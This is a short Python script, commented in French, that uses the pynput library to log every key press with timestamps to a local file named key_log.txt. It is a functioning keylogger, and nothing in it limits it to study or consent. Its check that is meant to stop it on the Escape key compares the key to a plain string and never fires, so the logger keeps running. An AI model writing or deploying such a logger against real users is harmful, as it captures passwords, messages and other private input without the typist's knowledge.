from pynput.keyboard import Listener
import logging

logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")


def on_press(key):
    try:
        
        logging.info(f"'{key.char}'")  # Enregistre la touche pressée
    except AttributeError:
        # Si la touche n'est pas un caractère imprimable
        logging.info(f"{key} key")


def on_release(key):
    if key == "esc":  # Si la touche 'esc' est pressée, on arrête le listener
        return False

# Démarrer
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
